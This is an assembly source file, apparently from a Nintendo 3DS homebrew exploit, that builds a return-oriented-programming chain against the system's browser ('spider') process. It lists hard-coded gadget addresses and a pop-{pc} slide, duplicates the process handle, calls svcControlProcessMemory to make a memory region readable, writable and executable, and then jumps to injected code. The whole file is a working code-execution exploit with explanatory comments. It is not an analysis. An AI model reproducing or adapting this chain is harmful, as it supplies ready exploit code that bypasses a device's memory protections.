.nds

.include "../../build/constants.s"

.create "ro_initial_rop.bin",0x0

	.word 0x14000f8c ; pop {r4, r5, r6, r7, pc}
		; initial return; loads up garbage into registers and moves on
		; (this is used by makeROP.py)
	.word 0x14006fc8 ; pop	{r4, lr} | bx lr
		.word 0xDEADC0DE ; r4 (garbage)
		.word 0x140057a8 ; lr = pop {pc}
	; equivalent to .word 0x140057a8 ; pop {pc}

	.word 0x140057a8 ; pop {pc} (NOP)
	.word 0x140057a8 ; pop {pc} (NOP)
	.word 0x140057a8 ; pop {pc} (NOP)
	.word 0x140057a8 ; pop {pc} (NOP)
	.word 0x140057a8 ; pop {pc} (NOP)
	.word 0x140057a8 ; pop {pc} (NOP)
	.word 0x140057a8 ; pop {pc} (NOP)
	.word 0x140057a8 ; pop {pc} (NOP)
	.word 0x140057a8 ; pop {pc} (NOP)
	.word 0x140057a8 ; pop {pc} (NOP)
	.word 0x140057a8 ; pop {pc} (NOP)
	.word 0x140057a8 ; pop {pc} (NOP)
	.word 0x140057a8 ; pop {pc} (NOP)
	.word 0x140057a8 ; pop {pc} (NOP)
	.word 0x140057a8 ; pop {pc} (NOP)
	.word 0x140057a8 ; pop {pc} (NOP)
	.word 0x140057a8 ; pop {pc} (NOP)
	.word 0x140057a8 ; pop {pc} (NOP)
	.word 0x140057a8 ; pop {pc} (NOP)
	.word 0x140057a8 ; pop {pc} (NOP)
	.word 0x140057a8 ; pop {pc} (NOP)
	.word 0x140057a8 ; pop {pc} (NOP)
	.word 0x140057a8 ; pop {pc} (NOP)
	.word 0x140057a8 ; pop {pc} (NOP)
	.word 0x140057a8 ; pop {pc} (NOP)
	.word 0x140057a8 ; pop {pc} (NOP)

;protect spider process handle value
.orga RO_SPIDERHANDLE_LOCATION-(RO_ROP_START+RO_ROP_OFFSET)
	.word 0x1400379c ; pop {r1, pc}
		.word 0xDEADBABE ; 0xDEADBABE is filtered out by makeROP.py (DO NOT CHANGE)

	.word 0x1400379c ; pop {r1, pc}
		.word 0xFFFF8001 ; r1 (handle)
	.word 0x140020C4 ; svcDuplicateHandle
		.word RO_PROCESSHANDLEADR ; output handle address
	.word 0x1400379c ; pop {r1, pc}
		.word RO_GARBAGEADR ; r1 => r0 => garbage
	.word 0x140007d4 ; mov r0, r1 | pop {r3, r4, r5, pc}
		.word 0xDEADC0DE ; r3 (garbage)
		.word RO_PROCESSHANDLEADR-4 ; r4 (later, r0 = [r4, #4])
		.word 0xDEADC0DE ; r5 (garbage)
	.word 0x1400379c ; pop {r1, pc}
		.word 0x00000000 ; r1 => r2 (addr1)
	.word 0x14007694 ; mov r2, r1 | stm r0, {r1, r2} | bx lr (pop {pc})
	.word 0x14000e90 ; ldr r0, [r4, #4] | pop {r4, r5, r6, pc}
		.word 0xDEADC0DE ; r4 (garbage)
		.word 0xDEADC0DE ; r5 (garbage)
		.word 0xDEADC0DE ; r6 (garbage)
	.word 0x140007d8 ; pop {r3, r4, r5, pc}
		.word 0x00005000 ; r3 (size)
		.word 0x00000006 ; r4 (type) (PROTECT)
		.word 0x00000007 ; r5 (permissions) (RWX)
	.word 0x1400379c ; pop {r1, pc}
		.word SPIDER_CROMAPADR ; r1 (addr0)
	.word 0x14004070 ; svcControlProcessMemory | LDMFD SP!, {R4,R5} | BX LR (pop {pc})
		.word 0xDEADC0DE ; r4 (garbage)
		.word 0x14000000 ; r5 (garbage)
	
	.word SPIDER_CROMAPADR+CRO_ROCODE_OFFSET ; jump to code

	; .word 0xDEADDEAD
	; .word 0xCAFEBABE
	; .word 0x00DA7A00
	; .word 0x00DEAD00
	; .word 0x00BABE00
	; .word 0xDEADBEEF
	; .word 0xDEADDEAD
	; .word 0xCAFEBABE
	; .word 0x00DA7A00
	; .word 0x00DEAD00
	; .word 0x00BABE00

.close
